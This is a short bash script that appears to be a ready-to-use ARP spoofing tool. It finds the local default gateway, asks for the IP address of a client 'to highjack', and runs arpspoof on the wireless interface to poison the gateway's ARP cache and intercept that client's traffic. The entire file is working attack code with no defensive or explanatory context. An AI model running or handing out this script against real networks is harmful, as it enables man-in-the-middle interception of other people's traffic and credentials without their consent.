#!/bin/bash
clear

route > temp1.txt
gateway_addr_var=$(more temp1.txt | grep default | tr -s ' ' | cut -d ' ' -f 2)
rm temp1.txt
echo -n 'Enter address of client ip to highjack : '
read client_addr_var

sudo arpspoof -i wlan0 -t $gateway_addr_var $client_addr_var
